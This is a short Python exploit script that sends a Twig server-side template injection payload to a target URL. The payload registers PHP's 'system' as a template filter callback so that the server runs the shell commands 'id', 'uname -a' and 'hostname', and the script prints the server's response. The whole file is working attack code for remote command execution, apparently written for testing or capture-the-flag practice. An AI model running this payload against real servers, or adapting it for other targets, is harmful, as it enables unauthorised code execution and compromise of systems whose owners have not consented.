#!/usr/bin/python3


import requests
import sys
from pwn import *


if __name__ == "__main__":

    try:

        main_url = sys.argv[1]
        # payload = sys.argv[2]
        ress = requests.post(url=main_url, data={"name":f"""{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}"""})
        log.progress('testing the web server for SSTI')
        print(ress.status_code)
        print(ress.text)

    except Exception as e:

        print(str(e))

    except KeyboardInterrupt:

        exit(0)
